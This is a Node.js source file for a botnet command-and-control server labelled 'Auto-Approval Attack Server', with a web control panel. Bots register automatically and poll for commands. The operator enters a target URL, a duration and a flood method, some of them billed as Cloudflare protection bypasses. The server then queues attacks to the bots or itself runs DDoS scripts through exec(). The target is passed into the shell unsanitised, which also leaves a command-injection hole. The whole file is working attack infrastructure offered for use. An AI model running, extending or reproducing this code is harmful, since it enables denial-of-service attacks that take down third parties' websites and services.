const express = require('express');
const { exec } = require('child_process');
const axios = require('axios');

const app = express();
app.use(express.json());

const port = process.env.PORT || 5553;

// Store connected bots with auto-approval
let connectedBots = [];

async function fetchData() {
  try {
    const response = await fetch('https://httpbin.org/get');
    const data = await response.json();
    console.log('\n========================================');
    console.log('Auto-Approval Attack Server Started!');
    console.log('========================================');
    console.log(`Local:    http://localhost:${port}`);
    console.log(`Network:  http://${data.origin}:${port}`);
    console.log('========================================\n');
    return data;
  } catch (error) {
    console.log(`Server running at http://localhost:${port}`);
  }
}

// Serve Control UI
app.get('/', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RICARDO SERVER</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @keyframes pulse-glow {
            0%, 100% { box-shadow: 0 0 20px rgba(239, 68, 68, 0.5); }
            50% { box-shadow: 0 0 40px rgba(239, 68, 68, 0.8); }
        }
        .pulse-glow { animation: pulse-glow 2s infinite; }
    </style>
</head>
<body class="bg-gradient-to-br from-gray-900 via-black to-gray-900 text-white min-h-screen">
    <!-- Header -->
    <div class="bg-black border-b border-red-900 shadow-lg">
        <div class="max-w-7xl mx-auto px-6 py-4">
            <div class="flex items-center justify-between">
                <div class="flex items-center gap-3">
                    <div class="w-12 h-12 bg-gradient-to-br from-red-600 to-red-800 rounded-lg flex items-center justify-center pulse-glow">
                        <span class="text-2xl">.</span>
                    </div>
                    <div>
                        <h1 class="text-2xl font-bold bg-gradient-to-r from-red-500 to-purple-600 bg-clip-text text-transparent">
                            Auto-Approval Attack Server
                        </h1>
                        <p class="text-xs text-gray-400">Bots Auto-Register & Execute</p>
                    </div>
                </div>
                <div class="text-right">
                    <div class="text-xs text-gray-500">Connected Bots</div>
                    <div class="flex items-center gap-2">
                        <div class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
                        <span class="text-2xl text-green-400 font-bold" id="botCount">0</span>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="max-w-7xl mx-auto px-6 py-8">
        <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
            <!-- Main Control -->
            <div class="lg:col-span-2 space-y-6">
                <!-- Connected Bots (Auto-Approved) -->
                <div class="bg-gray-800 rounded-lg border border-gray-700 shadow-xl">
                    <div class="bg-gradient-to-r from-green-900/50 to-blue-900/50 px-6 py-4 border-b border-gray-700">
                        <h2 class="text-xl font-bold flex items-center gap-2">
                            Auto-Approved Bots
                            <span class="text-xs bg-green-900 text-green-300 px-2 py-1 rounded ml-2">Auto-Register ON</span>
                        </h2>
                    </div>
                    <div class="p-6">
                        <div id="botsList" class="space-y-2 max-h-64 overflow-y-auto">
                            <p class="text-gray-500 text-center py-8">Waiting for bots to connect...</p>
                        </div>
                    </div>
                </div>

                <!-- Blocked Bots List -->
                <div class="bg-gray-800 rounded-lg border border-gray-700 shadow-xl">
                    <div class="bg-gradient-to-r from-red-900/50 to-orange-900/50 px-6 py-4 border-b border-gray-700">
                        <h2 class="text-xl font-bold flex items-center gap-2">
                            Blocked Bots
                        </h2>
                    </div>
                    <div class="p-6">
                        <div id="blockedList" class="space-y-2 max-h-48 overflow-y-auto">
                            <p class="text-gray-500 text-center py-4 text-sm">No blocked bots</p>
                        </div>
                    </div>
                </div>

                <!-- Attack Control -->
                <div class="bg-gray-800 rounded-lg border border-gray-700 shadow-xl">
                    <div class="bg-gradient-to-r from-red-900/50 to-purple-900/50 px-6 py-4 border-b border-gray-700">
                        <h2 class="text-xl font-bold flex items-center gap-2">
                            Start Attack
                        </h2>
                    </div>
                    <div class="p-6 space-y-4">
                        <div>
                            <label class="block text-sm font-medium text-gray-300 mb-2">Target URL</label>
                            <input type="text" id="target" 
                                class="w-full bg-gray-900 border border-gray-600 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-red-500 focus:ring-2 focus:ring-red-500/50" 
                                placeholder="https://example.com">
                        </div>

                        <div class="grid grid-cols-2 gap-4">
                            <div>
                                <label class="block text-sm font-medium text-gray-300 mb-2">Duration (seconds)</label>
                                <input type="number" id="time" value="60" 
                                    class="w-full bg-gray-900 border border-gray-600 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-red-500 focus:ring-2 focus:ring-red-500/50" 
                                    min="1">
                            </div>
                            <div>
                                <label class="block text-sm font-medium text-gray-300 mb-2">Attack Method</label>
                                <select id="method" 
                                    class="w-full bg-gray-900 border border-gray-600 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-red-500 focus:ring-2 focus:ring-red-500/50">
                                    <option>CF-BYPASS</option>
                                    <option>MODERN-FLOOD</option>
                                    <option>HTTP-SICARIO</option>
                                    <option>RAW-HTTP</option>
                                    <option>R9</option>
                                    <option>PRIV-TOR</option>
                                    <option>HOLD-PANEL</option>
                                    <option>R1</option>
                                    <option>UAM</option>
                                    <option>W.I.L</option>
                                </select>
                            </div>
                        </div>

                        <div class="flex gap-2">
                            <button onclick="attackAll()" id="attackBtn" 
                                class="flex-1 bg-gradient-to-r from-red-600 to-red-700 hover:from-red-700 hover:to-red-800 text-white font-bold py-4 px-6 rounded-lg transition-all transform hover:scale-105 shadow-lg">
                                Attack All Bots
                            </button>
                            <button onclick="stopAll()" id="stopBtn" 
                                class="flex-1 bg-gradient-to-r from-orange-600 to-orange-700 hover:from-orange-700 hover:to-orange-800 text-white font-bold py-4 px-6 rounded-lg transition-all transform hover:scale-105 shadow-lg">
                                Stop All Attacks
                            </button>
                        </div>
                        <button onclick="attackServer()" id="serverBtn" 
                            class="w-full bg-gradient-to-r from-purple-600 to-purple-700 hover:from-purple-700 hover:to-purple-800 text-white font-bold py-4 px-6 rounded-lg transition-all transform hover:scale-105 shadow-lg">
                            Attack (Server Only)
                        </button>

                        <div id="status" class="p-4 bg-gray-900 rounded-lg border border-gray-700 hidden">
                            <p class="text-sm"></p>
                        </div>
                    </div>
                </div>

                <!-- Activity Logs -->
                <div class="bg-gray-800 rounded-lg border border-gray-700 shadow-xl">
                    <div class="bg-gradient-to-r from-purple-900/50 to-pink-900/50 px-6 py-4 border-b border-gray-700 flex items-center justify-between">
                        <h2 class="text-xl font-bold flex items-center gap-2">
                            Activity Logs
                        </h2>
                        <button onclick="clearLogs()" 
                            class="text-xs bg-gray-700 hover:bg-gray-600 px-3 py-1 rounded transition-colors">
                            Clear
                        </button>
                    </div>
                    <div class="p-6">
                        <div id="logs" class="bg-gray-900 rounded-lg border border-gray-700 p-4 h-96 overflow-y-auto font-mono text-sm">
                            <p class="text-gray-500 text-center py-8">No activity yet...</p>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Sidebar -->
            <div class="space-y-6">
                <!-- Stats -->
                <div class="bg-gray-800 rounded-lg border border-gray-700 shadow-xl p-6">
                    <h3 class="text-lg font-bold mb-4">Statistics</h3>
                    <div class="space-y-3">
                        <div class="flex justify-between items-center">
                            <span class="text-gray-400 text-sm">Total Bots</span>
                            <span class="text-blue-400 font-bold" id="totalBots">0</span>
                        </div>
                        <div class="flex justify-between items-center">
                            <span class="text-gray-400 text-sm">Active Attacks</span>
                            <span class="text-red-400 font-bold" id="activeAttacks">0</span>
                        </div>
                        <div class="flex justify-between items-center">
                            <span class="text-gray-400 text-sm">Total Attacks</span>
                            <span class="text-green-400 font-bold" id="totalAttacks">0</span>
                        </div>
                        <div class="flex justify-between items-center">
                            <span class="text-gray-400 text-sm">Uptime</span>
                            <span class="text-purple-400 font-bold" id="uptime">0s</span>
                        </div>
                    </div>
                </div>

                <!-- Quick Actions -->
                <div class="bg-gray-800 rounded-lg border border-gray-700 shadow-xl p-6">
                    <h3 class="text-lg font-bold mb-4">Quick Actions</h3>
                    <div class="space-y-2">
                        <button onclick="refreshBots()" 
                            class="w-full bg-gray-700 hover:bg-gray-600 text-white py-2 px-4 rounded transition-colors text-sm">
                            Refresh Bots
                        </button>
                        <button onclick="removeAllBots()" 
                            class="w-full bg-red-900/50 hover:bg-red-800/50 text-white py-2 px-4 rounded transition-colors text-sm">
                            Remove All Bots
                        </button>
                    </div>
                </div>

                <!-- Available Methods -->
                <div class="bg-gray-800 rounded-lg border border-gray-700 shadow-xl p-6">
                    <h3 class="text-lg font-bold mb-4">Attack Methods</h3>
                    <div class="space-y-2 text-xs">
                        <div class="bg-gray-900 p-2 rounded border border-lime-900/30">
                            <div class="text-lime-400 font-bold">CF-BYPASS</div>
                            <div class="text-gray-500 text-xs mt-1">CloudFlare protection bypass</div>
                        </div>
                        <div class="bg-gray-900 p-2 rounded border border-cyan-900/30">
                            <div class="text-cyan-400 font-bold">MODERN-FLOOD</div>
                            <div class="text-gray-500 text-xs mt-1">HTTP/2 + vulnerabilities</div>
                        </div>
                        <div class="bg-gray-900 p-2 rounded border border-red-900/30">
                            <div class="text-red-400 font-bold">HTTP-SICARIO</div>
                        </div>
                        <div class="bg-gray-900 p-2 rounded border border-orange-900/30">
                            <div class="text-orange-400 font-bold">RAW-HTTP</div>
                        </div>
                        <div class="bg-gray-900 p-2 rounded border border-yellow-900/30">
                            <div class="text-yellow-400 font-bold">R9</div>
                        </div>
                        <div class="bg-gray-900 p-2 rounded border border-green-900/30">
                            <div class="text-green-400 font-bold">PRIV-TOR</div>
                        </div>
                        <div class="bg-gray-900 p-2 rounded border border-blue-900/30">
                            <div class="text-blue-400 font-bold">HOLD-PANEL</div>
                        </div>
                        <div class="bg-gray-900 p-2 rounded border border-purple-900/30">
                            <div class="text-purple-400 font-bold">R1</div>
                        </div>
                        <div class="bg-gray-900 p-2 rounded border border-indigo-900/30">
                            <div class="text-indigo-400 font-bold">UAM</div>
                            <div class="text-gray-500 text-xs mt-1">Advanced CF bypass with puppeteer</div>
                        </div>
                        <div class="bg-gray-900 p-2 rounded border border-pink-900/30">
                            <div class="text-pink-400 font-bold">W.I.L</div>
                            <div class="text-gray-500 text-xs mt-1">Web Intensive Load - Ultimate power</div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        let bots = [];
        let blockedBots = [];
        let totalAttacks = 0;
        let activeAttacks = 0;
        let startTime = Date.now();

        // Update uptime
        setInterval(() => {
            const seconds = Math.floor((Date.now() - startTime) / 1000);
            const hours = Math.floor(seconds / 3600);
            const minutes = Math.floor((seconds % 3600) / 60);
            const secs = seconds % 60;
            document.getElementById('uptime').textContent = 
                hours > 0 ? \`\${hours}h \${minutes}m\` : \`\${minutes}m \${secs}s\`;
        }, 1000);

        // Auto-refresh bot list every 5 seconds
        setInterval(() => {
            refreshBots();
            refreshBlockedBots();
        }, 5000);

        function updateStats() {
            document.getElementById('botCount').textContent = bots.length;
            document.getElementById('totalBots').textContent = bots.length;
            document.getElementById('totalAttacks').textContent = totalAttacks;
            document.getElementById('activeAttacks').textContent = activeAttacks;
        }

        function renderBlockedBots() {
            const blockedList = document.getElementById('blockedList');
            if (blockedBots.length === 0) {
                blockedList.innerHTML = '<p class="text-gray-500 text-center py-4 text-sm">No blocked bots</p>';
                return;
            }

            blockedList.innerHTML = blockedBots.map((botUrl, index) => \`
                <div class="bg-gray-900 p-3 rounded-lg border border-red-900/30 flex items-center justify-between">
                    <div class="flex items-center gap-2">
                        <div class="w-2 h-2 bg-red-500 rounded-full"></div>
                        <div class="text-white font-mono text-xs">\${botUrl}</div>
                    </div>
                    <button onclick="unblockBot('\${botUrl}')" 
                        class="text-green-400 hover:text-green-300 text-xs px-2 py-1 bg-green-900/30 rounded">
                        Unblock
                    </button>
                </div>
            \`).join('');
        }

        function renderBots() {
            const botsList = document.getElementById('botsList');
            if (bots.length === 0) {
                botsList.innerHTML = '<p class="text-gray-500 text-center py-8">Waiting for bots to connect...</p>';
                return;
            }

            const now = Date.now();

            botsList.innerHTML = bots.map((bot, index) => {
                const timeSinceLastSeen = now - (bot.lastSeen || now);
                const isOnline = timeSinceLastSeen < 60000; // Online if seen in last 60 seconds
                const statusColor = isOnline ? 'bg-green-500' : 'bg-red-500';
                const statusText = isOnline ? 'Online' : 'Offline';
                const statusTextColor = isOnline ? 'text-green-400' : 'text-red-400';
                
                return \`
                <div class="bg-gray-900 p-4 rounded-lg border border-gray-700 flex items-center justify-between">
                    <div class="flex items-center gap-3">
                        <div class="w-2 h-2 \${statusColor} rounded-full \${isOnline ? 'animate-pulse' : ''}"></div>
                        <div>
                            <div class="text-white font-mono text-sm">\${bot.url}</div>
                            <div class="text-xs text-gray-500">
                                Bot #\${index + 1} | <span class="\${statusTextColor}">\${statusText}</span> | Registered: \${bot.time}
                            </div>
                        </div>
                    </div>
                    <div class="flex gap-2">
                        <button onclick="removeBot(\${index})" 
                            class="text-yellow-400 hover:text-yellow-300 text-sm px-2 py-1 bg-yellow-900/30 rounded">
                            Remove
                        </button>
                        <button onclick="blockBot(\${index})" 
                            class="text-red-400 hover:text-red-300 text-sm px-2 py-1 bg-red-900/30 rounded">
                            Block
                        </button>
                    </div>
                </div>
            \`;
            }).join('');
        }

        function removeBot(index) {
            const bot = bots[index];
            bots.splice(index, 1);
            renderBots();
            updateStats();
            addLog(\`Bot removed (temporary): \${bot.url}\`, 'info');
        }

        async function blockBot(index) {
            const bot = bots[index];
            
            if (!confirm(\`Permanently block this bot?\n\n\${bot.url}\n\nThe bot will not be able to reconnect.\`)) {
                return;
            }

            try {
                const response = await fetch(\`/block-bot?bot=\${encodeURIComponent(bot.url)}\`);
                const data = await response.json();
                
                if (data.success) {
                    bots.splice(index, 1);
                    renderBots();
                    updateStats();
                    refreshBlockedBots();
                    addLog(\`Bot permanently blocked: \${bot.url}\`, 'success');
                } else {
                    addLog(\`Failed to block bot: \${data.error}\`, 'error');
                }
            } catch (error) {
                addLog(\`Error blocking bot: \${error.message}\`, 'error');
            }
        }

        async function unblockBot(botUrl) {
            if (!confirm(\`Unblock this bot?\n\n\${botUrl}\n\nThe bot will be able to reconnect.\`)) {
                return;
            }

            try {
                const response = await fetch(\`/unblock-bot?bot=\${encodeURIComponent(botUrl)}\`);
                const data = await response.json();
                
                if (data.success) {
                    refreshBlockedBots();
                    addLog(\`Bot unblocked: \${botUrl}\`, 'success');
                } else {
                    addLog(\`Failed to unblock bot: \${data.error}\`, 'error');
                }
            } catch (error) {
                addLog(\`Error unblocking bot: \${error.message}\`, 'error');
            }
        }

        function removeAllBots() {
            if (confirm('Remove all bots?')) {
                bots = [];
                renderBots();
                updateStats();
                addLog('All bots removed', 'info');
            }
        }

        async function refreshBots() {
            try {
                const response = await fetch('/bots');
                const data = await response.json();
                bots = data.bots;
                renderBots();
                updateStats();
            } catch (error) {
                console.error('Failed to refresh bots:', error);
            }
        }

        async function refreshBlockedBots() {
            try {
                const response = await fetch('/blocked');
                const data = await response.json();
                blockedBots = data.blocked;
                renderBlockedBots();
            } catch (error) {
                console.error('Failed to refresh blocked bots:', error);
            }
        }

        async function attackAll() {
            const target = document.getElementById('target').value;
            const time = document.getElementById('time').value;
            const method = document.getElementById('method').value;

            if (!target || !time) {
                addLog('Error: Target and time required', 'error');
                return;
            }

            if (bots.length === 0) {
                addLog('Error: No bots connected', 'error');
                return;
            }

            const btn = document.getElementById('attackBtn');
            btn.disabled = true;
            btn.textContent = 'Launching...';
            
            activeAttacks++;
            totalAttacks++;
            updateStats();

            addLog(\`Launching \${method} to \${bots.length} bots\`, 'info');
            addLog(\`Target: \${target} | Duration: \${time}s\`, 'info');

            let successCount = 0;
            let failCount = 0;

            for (const bot of bots) {
                try {
                    const response = await fetch(\`/attack-bot?bot=\${encodeURIComponent(bot.url)}&target=\${encodeURIComponent(target)}&time=\${time}&methods=\${method}\`);
                    const data = await response.json();
                    
                    if (data.success) {
                        successCount++;
                        addLog(\`\${bot.url} - Attack launched\`, 'success');
                    } else {
                        failCount++;
                        addLog(\`\${bot.url} - Failed\`, 'error');
                    }
                } catch (error) {
                    failCount++;
                    addLog(\`\${bot.url} - Network error\`, 'error');
                }
            }

            addLog(\`Attack complete: \${successCount} success, \${failCount} failed\`, 'info');

            setTimeout(() => {
                activeAttacks = Math.max(0, activeAttacks - 1);
                updateStats();
            }, parseInt(time) * 1000);

            btn.disabled = false;
            btn.textContent = 'Attack All Bots';
        }

        async function stopAll() {
            const btn = document.getElementById('stopBtn');
            btn.disabled = true;
            btn.textContent = 'Stopping...';

            addLog('Sending stop command to all bots', 'info');

            try {
                const response = await fetch('/stop-all');
                const data = await response.json();
                
                if (data.success) {
                    addLog(\`Stop command sent: \${data.message}\`, 'success');
                    activeAttacks = 0;
                    updateStats();
                } else {
                    addLog('Failed to send stop command', 'error');
                }
            } catch (error) {
                addLog(\`Error: \${error.message}\`, 'error');
            } finally {
                btn.disabled = false;
                btn.textContent = 'Stop All Attacks';
            }
        }

        async function attackServer() {
            const target = document.getElementById('target').value;
            const time = document.getElementById('time').value;
            const method = document.getElementById('method').value;

            if (!target || !time) {
                addLog('Error: Target and time required', 'error');
                return;
            }

            const btn = document.getElementById('serverBtn');
            const status = document.getElementById('status');
            
            btn.disabled = true;
            btn.textContent = 'Executing...';
            
            activeAttacks++;
            totalAttacks++;
            updateStats();

            addLog(\`Server executing \${method} attack on \${target}\`, 'info');

            try {
                const response = await fetch(\`/attack?target=\${encodeURIComponent(target)}&time=\${time}&methods=\${method}\`);
                const data = await response.json();
                
                if (response.ok) {
                    addLog(\`Server attack launched!\`, 'success');
                    status.classList.remove('hidden');
                    status.querySelector('p').innerHTML = \`
                        <strong class="text-red-400">Server Active:</strong> 
                        <span class="text-white">\${target}</span> | 
                        <span class="text-yellow-400">\${method}</span> | 
                        <span class="text-green-400">\${time}s</span>
                    \`;
                    
                    setTimeout(() => {
                        activeAttacks = Math.max(0, activeAttacks - 1);
                        updateStats();
                    }, parseInt(time) * 1000);
                } else {
                    addLog(\`Error: Server attack failed\`, 'error');
                    activeAttacks = Math.max(0, activeAttacks - 1);
                    updateStats();
                }
            } catch (error) {
                addLog(\`Network Error: \${error.message}\`, 'error');
                activeAttacks = Math.max(0, activeAttacks - 1);
                updateStats();
            } finally {
                btn.disabled = false;
                btn.textContent = 'Attack (Server Only)';
            }
        }

        function addLog(message, type = 'info') {
            const logsDiv = document.getElementById('logs');
            const timestamp = new Date().toLocaleTimeString();
            const icons = { info: '[INFO]', success: '[OK]', error: '[ERROR]' };
            const colors = { info: 'text-blue-400', success: 'text-green-400', error: 'text-red-400' };
            
            if (logsDiv.querySelector('.text-gray-500')) {
                logsDiv.innerHTML = '';
            }
            
            const logEntry = document.createElement('div');
            logEntry.className = 'mb-2 pb-2 border-b border-gray-800';
            logEntry.innerHTML = \`
                <div class="flex items-start gap-2">
                    <span class="\${colors[type]}">\${icons[type]}</span>
                    <div class="flex-1">
                        <span class="text-gray-500 text-xs">[\${timestamp}]</span>
                        <span class="\${colors[type]} ml-2">\${message}</span>
                    </div>
                </div>
            \`;
            logsDiv.appendChild(logEntry);
            logsDiv.scrollTop = logsDiv.scrollHeight;
        }

        function clearLogs() {
            document.getElementById('logs').innerHTML = '<p class="text-gray-500 text-center py-8">No activity yet...</p>';
        }

        // Initial bot list load
        refreshBots();
        refreshBlockedBots();
    </script>
</body>
</html>
  `);
});

// Pending attack commands queue
let pendingCommands = {};
let stopCommands = new Set(); // Track which bots should stop
let blockedBots = new Set(); // Track blocked bot URLs

// Auto-register endpoint - bots call this to register themselves
app.post('/register', (req, res) => {
  const { url } = req.body;

  if (!url) {
    return res.status(400).json({ error: 'Bot URL required' });
  }

  // Check if bot is blocked
  if (blockedBots.has(url)) {
    console.log(`[BLOCKED] Bot tried to register: ${url}`);
    return res.status(403).json({ 
      error: 'Bot is blocked',
      approved: false,
      message: 'This bot has been permanently blocked by the server'
    });
  }

  // Check if bot already registered
  const exists = connectedBots.find(bot => bot.url === url);
  if (exists) {
    // Update last seen time
    exists.lastSeen = Date.now();
    return res.json({ message: 'Bot already registered', approved: true });
  }

  // Auto-approve and add bot
  const newBot = {
    url: url,
    time: new Date().toLocaleTimeString(),
    approved: true,
    lastSeen: Date.now()
  };

  connectedBots.push(newBot);
  console.log(`[AUTO-APPROVED] New bot registered: ${url}`);

  res.json({ 
    message: 'Bot auto-approved and registered successfully',
    approved: true,
    bot: newBot
  });
});

// Bot polls for commands (pull-based system)
app.get('/get-command', (req, res) => {
  const { botUrl } = req.query;

  if (!botUrl) {
    return res.status(400).json({ error: 'Bot URL required' });
  }

  // Update bot last seen
  const bot = connectedBots.find(b => b.url === botUrl);
  if (bot) {
    bot.lastSeen = Date.now();
  }

  // Check if there's a stop command for this bot
  if (stopCommands.has(botUrl)) {
    stopCommands.delete(botUrl); // Remove after sending
    console.log(`[STOP-SENT] Sending stop command to ${botUrl}`);
    return res.json({ hasCommand: true, command: { action: 'stop' } });
  }

  // Check if there's a pending command for this bot
  if (pendingCommands[botUrl]) {
    const command = pendingCommands[botUrl];
    delete pendingCommands[botUrl]; // Remove after sending
    console.log(`[COMMAND-SENT] Sending command to ${botUrl}: ${command.methods}`);
    return res.json({ hasCommand: true, command: { action: 'attack', ...command } });
  }

  // No command
  res.json({ hasCommand: false });
});

// Get all connected bots
app.get('/bots', (req, res) => {
  res.json({ bots: connectedBots });
});

// Ping endpoint for bot heartbeat
app.get('/ping', (req, res) => {
  res.json({ 
    alive: true, 
    timestamp: Date.now(),
    status: 'online'
  });
});

// Attack bot endpoint - queue command for bot to pull
app.get('/attack-bot', async (req, res) => {
  const { bot, target, time, methods } = req.query;

  if (!bot || !target || !time || !methods) {
    return res.json({ success: false, error: 'Missing parameters' });
  }

  console.log(`[QUEUE-COMMAND] Queuing ${methods} for ${bot}`);
  
  // Queue the command for the bot to pull
  pendingCommands[bot] = {
    target,
    time,
    methods,
    timestamp: Date.now()
  };

  res.json({ success: true, message: 'Command queued for bot' });
});

// Stop bot endpoint - queue stop command
app.get('/stop-bot', async (req, res) => {
  const { bot } = req.query;

  if (!bot) {
    return res.json({ success: false, error: 'Bot URL required' });
  }

  console.log(`[QUEUE-STOP] Queuing stop command for ${bot}`);
  
  // Remove any pending attack commands
  delete pendingCommands[bot];
  
  // Queue stop command
  stopCommands.add(bot);

  res.json({ success: true, message: 'Stop command queued for bot' });
});

// Stop all bots
app.get('/stop-all', async (req, res) => {
  console.log(`[STOP-ALL] Queuing stop for all bots`);
  
  // Clear all pending commands
  pendingCommands = {};
  
  // Queue stop for all bots
  connectedBots.forEach(bot => {
    stopCommands.add(bot.url);
  });

  res.json({ success: true, message: `Stop queued for ${connectedBots.length} bots` });
});

// Block/Unblock bot endpoint
app.get('/block-bot', (req, res) => {
  const { bot } = req.query;

  if (!bot) {
    return res.json({ success: false, error: 'Bot URL required' });
  }

  // Add to blocked list
  blockedBots.add(bot);
  
  // Remove from connected bots
  connectedBots = connectedBots.filter(b => b.url !== bot);
  
  // Clear any pending commands
  delete pendingCommands[bot];
  stopCommands.delete(bot);

  console.log(`[BLOCKED] Bot permanently blocked: ${bot}`);

  res.json({ success: true, message: 'Bot blocked permanently', bot });
});

// Unblock bot endpoint
app.get('/unblock-bot', (req, res) => {
  const { bot } = req.query;

  if (!bot) {
    return res.json({ success: false, error: 'Bot URL required' });
  }

  blockedBots.delete(bot);
  console.log(`[UNBLOCKED] Bot unblocked: ${bot}`);

  res.json({ success: true, message: 'Bot unblocked', bot });
});

// Get blocked bots list
app.get('/blocked', (req, res) => {
  res.json({ blocked: Array.from(blockedBots) });
});

// Direct server attack endpoint
app.get('/attack', (req, res) => {
  const { target, time, methods } = req.query;

  if (!target || !time || !methods) {
    return res.status(400).json({
      error: 'Missing required parameters: target, time, methods'
    });
  }

  console.log(`\n[SERVER-ATTACK] ${methods} -> ${target} for ${time}s`);

  res.status(200).json({
    message: 'Server attack launched successfully',
    target,
    time,
    methods,
    server: 'executing'
  });

  const execWithLog = (cmd) => {
    exec(cmd, (error, stdout, stderr) => {
      if (error) {
        console.error(`[ERROR] ${error.message}`);
        return;
      }
      if (stdout) console.log(`[OUTPUT] ${stdout}`);
      if (stderr) console.error(`[STDERR] ${stderr}`);
    });
  };

  if (methods === 'CF-BYPASS') {
    console.log('[OK] Executing CF-BYPASS');
    execWithLog(`node methods/cf-bypass.js ${target} ${time} 4 32 proxy.txt`);
  }
  else if (methods === 'MODERN-FLOOD') {
    console.log('[OK] Executing MODERN-FLOOD');
    execWithLog(`node methods/modern-flood.js ${target} ${time} 4 64 proxy.txt`);
  }
  else if (methods === 'HTTP-SICARIO') {
    console.log('[OK] Executing HTTP-SICARIO');
    execWithLog(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);
    execWithLog(`node methods/cibi.js ${target} ${time} 16 3 proxy.txt`);
    execWithLog(`node methods/BYPASS.js ${target} ${time} 32 2 proxy.txt`);
    execWithLog(`node methods/nust.js ${target} ${time} 12 4 proxy.txt`);
  } 
  else if (methods === 'RAW-HTTP') {
    console.log('[OK] Executing RAW-HTTP');
    execWithLog(`node methods/h2-nust ${target} ${time} 15 2 proxy.txt`);
    execWithLog(`node methods/http-panel.js ${target} ${time}`);
  } 
  else if (methods === 'R9') {
    console.log('[OK] Executing R9');
    execWithLog(`node methods/high-dstat.js ${target} ${time} 32 7 proxy.txt`);
    execWithLog(`node methods/w-flood1.js ${target} ${time} 8 3 proxy.txt`);
    execWithLog(`node methods/vhold.js ${target} ${time} 16 2 proxy.txt`);
    execWithLog(`node methods/nust.js ${target} ${time} 16 2 proxy.txt`);
    execWithLog(`node methods/BYPASS.js ${target} ${time} 8 1 proxy.txt`);
  } 
  else if (methods === 'PRIV-TOR') {
    console.log('[OK] Executing PRIV-TOR');
    execWithLog(`node methods/w-flood1.js ${target} ${time} 64 6 proxy.txt`);
    execWithLog(`node methods/high-dstat.js ${target} ${time} 16 2 proxy.txt`);
    execWithLog(`node methods/cibi.js ${target} ${time} 12 4 proxy.txt`);
    execWithLog(`node methods/BYPASS.js ${target} ${time} 10 4 proxy.txt`);
    execWithLog(`node methods/nust.js ${target} ${time} 10 1 proxy.txt`);
  } 
  else if (methods === 'HOLD-PANEL') {
    console.log('[OK] Executing HOLD-PANEL');
    execWithLog(`node methods/http-panel.js ${target} ${time}`);
  } 
  else if (methods === 'R1') {
    console.log('[OK] Executing R1');
    execWithLog(`node methods/vhold.js ${target} ${time} 15 2 proxy.txt`);
    execWithLog(`node methods/high-dstat.js ${target} ${time} 64 2 proxy.txt`);
    execWithLog(`node methods/cibi.js ${target} ${time} 4 2 proxy.txt`);
    execWithLog(`node methods/BYPASS.js ${target} ${time} 16 2 proxy.txt`);
    execWithLog(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);
    execWithLog(`node methods/w-flood1.js ${target} ${time} 8 3 proxy.txt`);
    execWithLog(`node methods/vhold.js ${target} ${time} 16 2 proxy.txt`);
    execWithLog(`node methods/nust.js ${target} ${time} 32 3 proxy.txt`);
  }
  else if (methods === 'UAM') {
    console.log('[OK] Executing UAM');
    execWithLog(`node methods/uam.js ${target} ${time} 5 4 6`);
  }
  else if (methods === 'W.I.L') {
    console.log('[OK] Executing W.I.L - Web Intensive Load');
    execWithLog(`node methods/wil.js ${target} ${time} 10 8 4`);
  }
});

app.listen(port, () => {
  fetchData();
});
